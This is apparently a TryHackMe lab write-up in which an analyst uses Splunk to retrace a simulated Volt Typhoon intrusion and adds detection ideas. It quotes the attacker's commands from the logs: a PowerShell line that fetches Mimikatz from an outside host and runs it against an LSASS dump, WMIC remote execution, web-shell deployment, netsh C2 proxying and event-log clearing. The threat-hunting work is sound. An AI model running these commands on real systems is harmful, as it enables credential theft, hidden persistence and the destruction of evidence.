# TryHackMe - Volt Typhoon

## Overview

This write-up documents my investigation of the TryHackMe room **Volt Typhoon**, where I played the role of a security analyst retracing a suspected APT intrusion through Splunk logs.

The scenario provided multiple log sources over a two-week period. My goal was to rebuild the attacker timeline, identify the compromised account, follow execution and persistence activity, and extract the key indicators left behind by the attacker.

## Lab Context

- Platform: TryHackMe
- Room: Volt Typhoon
- Focus: Threat hunting, Splunk analysis, Windows logs, PowerShell, WMIC, credential access
- Main tools: Splunk, PowerShell log analysis, base64 decoding, Windows event knowledge
- Target behavior: Volt Typhoon-style use of living-off-the-land binaries and stealthy persistence

## Investigation Summary

The intrusion began with the takeover of the `dean-admin` account through ADSelfService Plus. After that, the attacker created a new administrator account, used WMIC for reconnaissance and remote command execution, copied sensitive Active Directory and financial data, deployed a web shell for persistence, performed credential access with registry queries and Mimikatz, configured a C2 proxy with `netsh`, and finally cleared event logs to cover tracks.

## Threat Intelligence Context

Before polishing this write-up, I compared my notes with public references from Microsoft, Splunk Security Content, CISA/FBI guidance, and other public TryHackMe write-ups. The same themes appeared repeatedly:

- heavy use of living-off-the-land tools;
- command-line and hands-on-keyboard activity;
- valid credential abuse;
- archive staging before exfiltration;
- web shell or proxy-based persistence;
- cleanup through log clearing and artifact removal.

This made the lab more realistic because the answers were not isolated flags. They formed a coherent intrusion timeline.

## Initial Access

The room first pointed to ADSelfService Plus logs. I searched for password changes linked to the compromised admin account:

```spl
index=* service_name=ADSelfServicePlus username="dean-admin" "password change"
```

This revealed a successful password change:

- Account: `dean-admin`
- Service: `ADSelfServicePlus`
- Source IP: `192.168.1.134`
- Access mode: `web_browser`
- Timestamp: `2024-03-24T11:10:22`

Why this query worked: the task pointed to ADSelfService Plus, so filtering on the service and the compromised admin user quickly reduced the noise.

The attacker then created a new administrator account. I inspected the `username` field values and used rare values/frequency to identify the suspicious account:

```text
voltyp-admin
```

## Execution

Volt Typhoon is known to abuse WMIC for remote execution and reconnaissance. I filtered on the WMIC sourcetype and looked for commands involving `server01` and `server02`:

```spl
index="main" sourcetype="wmic" "*server01*" "*server02*"
```

The attacker enumerated local drives with:

```cmd
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
```

I then investigated how the attacker compressed the Active Directory database copy. My first search for `ntds` did not give me the answer directly, so I pivoted toward compression tools and searched for `7z`:

```spl
index="main" sourcetype="wmic" "*7z*"
```

The command exposed the archive password:

```cmd
wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"
```

Archive password:

```text
d5ag0nm@5t3r
```

## Persistence

The attacker used a web shell to maintain access. I focused on suspicious web extensions and PowerShell activity. The logs showed a base64-decoded file being written to a temporary directory:

```powershell
certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx
```

The web shell was first placed in:

```text
C:\Windows\Temp\
```

It was then copied to the IIS web root on another server:

```powershell
Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"
```

The name `AuditReport.jspx` looks like a legitimate reporting file, which makes it a good disguise for a web shell.

## Defense Evasion

The attacker attempted to reduce forensic traces by removing RDP history. I searched PowerShell logs for removal activity:

```spl
index="main" sourcetype=powershell remove
```

The relevant cmdlet was:

```powershell
Remove-ItemProperty
```

I also found the archive being renamed to look like an image:

```spl
index="main" 7z
```

The attacker changed:

```text
cisco-up.7z -> c164.gif
```

Renaming an archive to `.gif` is a simple but effective way to hide the data in a web directory.

The attacker also checked for virtualization artifacts:

```spl
index="main" "virtual"
```

Registry path checked:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
```

## Credential Access

The attacker used `reg query` to look for software that may store useful credentials. I searched for registry query activity:

```spl
index="main" "reg query" CommandLine=reg
```

The three investigated software targets were:

```text
OpenSSH, putty, realvnc
```

For Mimikatz, a direct search was not enough because the command was obfuscated. Since PowerShell encoded commands often contain base64 padding, I searched for execution flags and `=`:

```spl
index="main" "exec" "="
```

The log contained a hidden PowerShell execution with an encoded payload:

```powershell
-exec bypass -w hidden -nop -E <base64>
```

After decoding the payload, I found the full command:

```powershell
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp","exit") -NoNewWindow -Wait
```

This downloads Mimikatz and runs it against an LSASS dump.

## Discovery

The attacker used `wevtutil` to query Windows event logs. I used the words from the task prompt to shape the search:

```spl
index="main" "wevtutil" "eventid"
```

Event IDs searched by the attacker:

```text
4624 4625 4769
```

These correspond to successful logons, failed logons, and Kerberos service ticket activity. This helps the attacker understand authentication patterns and useful accounts.

## Lateral Movement

Because earlier evidence showed web shells using `.aspx` and `.jspx`, I searched for ASPX activity and then refined the query with the target server:

```spl
index="main" aspx server-02
```

The attacker copied the original web shell to `server-02`:

```powershell
Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"
```

New web shell:

```text
AuditReport.jspx
```

## Collection

For the collection phase, I focused on PowerShell copy operations and financial keywords. The useful search was:

```spl
index="main" sourcetype=powershell CommandLine="Copy-Item"
```

The attacker copied financial backups from:

```text
C:\ProgramData\FinanceBackup\
```

to:

```text
C:\Windows\Temp\faudit\
```

Files copied:

```text
2022.csv 2023.csv 2024.csv
```

This looks like staging before compression or exfiltration.

## Command and Control

The attacker used `netsh` to configure a port proxy for C2 communication:

```spl
index="main" netsh
```

The relevant command configured:

```text
connectaddress=10.2.30.1
connectport=8443
```

Answer:

```text
10.2.30.1 8443
```

## Cleanup

To identify cleanup activity, I searched for `cl`, which is used with `wevtutil` to clear event logs:

```spl
index="main" cl
```

The attacker cleared four event logs:

```text
Application Security Setup System
```

## Evidence Screenshots

The image slots below are prepared for the portfolio version. The screenshots still need to be exported from the browser/session and placed under:

```text
assets/writeups/volt-typhoon/
```

Suggested filenames:

| Screenshot | Purpose |
| --- | --- |
| `01-initial-access-adss.png` | ADSelfService Plus password change for `dean-admin` |
| `02-wmic-7z-password.png` | WMIC + 7-Zip archive password |
| `03-webshell-persistence.png` | `certutil` decode and web shell copy |
| `04-defense-evasion.png` | RDP cleanup, archive rename, VM check |
| `05-mimikatz-base64.png` | Encoded PowerShell and decoded Mimikatz command |
| `06-c2-cleanup.png` | `netsh` proxy and event log clearing |

## Key Indicators

| Type | Indicator |
| --- | --- |
| Compromised account | `dean-admin` |
| Created admin account | `voltyp-admin` |
| Initial access timestamp | `2024-03-24T11:10:22` |
| Suspicious IP | `192.168.1.134` |
| WMIC source IP | `192.168.1.153` |
| Archive password | `d5ag0nm@5t3r` |
| Archive disguise | `c164.gif` |
| Web shell | `AuditReport.jspx` |
| Staging directory | `C:\Windows\Temp\faudit\` |
| C2 address | `10.2.30.1:8443` |
| Mimikatz URL | `http://voltyp.com/3/tlz/mimikatz.exe` |

## MITRE ATT&CK Mapping

| Tactic | Technique observed |
| --- | --- |
| Initial Access | Exploitation of public-facing application / ADSelfService Plus compromise |
| Execution | WMIC, PowerShell |
| Persistence | Web shell in IIS web root |
| Defense Evasion | RDP MRU cleanup, file renaming, log clearing |
| Credential Access | Registry credential hunting, Mimikatz, LSASS dump |
| Discovery | `wevtutil`, drive enumeration, virtualization checks |
| Lateral Movement | Copying web shell to another server |
| Collection | Financial CSV files staged in temp directory |
| Command and Control | `netsh` port proxy |

## Detection Ideas

| Behavior | Search idea | Why it matters |
| --- | --- | --- |
| Encoded PowerShell | `sourcetype=powershell ("-enc" OR "-E" OR "FromBase64String")` | Helps identify hidden payloads |
| WMIC remote execution | `sourcetype=wmic "process call create"` | Finds remote command execution |
| Archive staging | `"7z" OR ".7z" OR "-p"` | Can reveal compressed data and archive passwords |
| Web shell copy | `sourcetype=powershell "Copy-Item" ("wwwroot" OR ".aspx" OR ".jspx")` | Useful for IIS persistence hunting |
| Log clearing | `"wevtutil cl"` | Strong cleanup indicator |
| Port proxy | `"netsh" "portproxy" "connectaddress"` | Matches C2 proxy setup behavior |

## Lessons Learned

This lab reinforced how important it is to pivot instead of relying on one keyword. For example, searching for `ntds` did not immediately reveal the archive password, but searching for compression behavior with `7z` did. The same applied to Mimikatz: the command was hidden behind base64, so looking for encoded PowerShell patterns was more effective than searching only for the tool name.

The investigation also showed how Volt Typhoon-style activity can blend into normal administration: WMIC, PowerShell, `netsh`, `certutil`, `wevtutil`, and registry queries are all legitimate Windows tools, but the sequence of actions exposed the intrusion clearly.

## References

- [Splunk Security Content - Volt Typhoon analytic story](https://research.splunk.com/stories/volt_typhoon/)
- [Microsoft Security Blog - Volt Typhoon living-off-the-land techniques](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)
- [CISA/FBI advisory AA24-038A - PRC state-sponsored actors](https://www.fbi.gov/file-repository/cyber-alerts/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-to-u-s-critical-infrastructure.pdf)
- [Djalil Ayed - TryHackMe Volt Typhoon write-up](https://djalilayed.github.io/posts/tryhackme-volt-typhoonwrite-up/)
